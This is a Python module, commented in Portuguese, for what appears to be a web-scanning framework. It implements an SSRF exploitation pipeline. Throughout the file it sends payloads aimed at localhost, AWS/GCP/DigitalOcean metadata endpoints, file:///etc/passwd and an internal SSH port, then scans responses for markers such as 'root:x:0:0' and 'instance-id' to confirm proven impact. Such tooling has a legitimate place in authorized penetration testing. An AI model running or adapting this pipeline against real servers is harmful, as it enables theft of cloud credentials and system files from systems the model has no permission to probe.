"""
SsrfPipeline — Pipeline de exploração de Server-Side Request Forgery (Fase 3)

Testa:
1. Payloads apontando para localhost/metadados de cloud.
2. Payloads de callback OOB (requer burp collaborator ou similar).
3. Blind SSRF por timing de resposta.
"""

from __future__ import annotations

from typing import List, Tuple

from core.models import QueueItem
from plugins.pipelines import BasePipeline, _HttpResult, _http_send_item


# Alvos internos comuns — confirma acesso a recursos internos
_INTERNAL_TARGETS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",   # AWS metadata
    "http://metadata.google.internal/",            # GCP metadata
    "http://169.254.169.254/metadata/v1/",         # DigitalOcean
    "file:///etc/passwd",
    "dict://127.0.0.1:22/",
]

# Indicadores de acesso a recursos internos
_INTERNAL_INDICATORS = [
    "ami-id", "instance-id", "local-ipv4",        # AWS
    "computeMetadata", "instance/hostname",         # GCP
    "droplet_id", "vendor-data",                   # DigitalOcean
    "root:x:0:0",                                  # /etc/passwd
    "ssh-", "220 ", "Connection refused",          # serviços internos
]


class SsrfPipeline(BasePipeline):
    name = "SsrfPipeline"
    MAX_ATTEMPTS = 5

    def _get_payloads(self, item: QueueItem) -> List[str]:
        return _INTERNAL_TARGETS

    def _execute(self, item: QueueItem, payload: str) -> Tuple[str, _HttpResult]:
        return _http_send_item(item, payload, fallback_param="url", timeout=12)

    def _verify(self, result: _HttpResult, payload: str, item: QueueItem) -> str:
        if result.status == 0:
            return "failed"

        body = result.body

        # Confirmar conteúdo de recurso interno refletido na resposta
        for indicator in _INTERNAL_INDICATORS:
            if indicator.lower() in body.lower():
                return "impact_proven"

        # Servidor respondeu com conteúdo não vazio para URL interna → parcial
        if result.status in (200, 201) and len(body) > 50:
            if "127.0.0.1" in payload or "localhost" in payload or "169.254" in payload:
                return "partial"

        # Servidor rejeitou mas URL foi processada (redirect, 400 com URL no body)
        if payload in body or payload.split("/")[-1] in body:
            return "partial"

        return "failed"
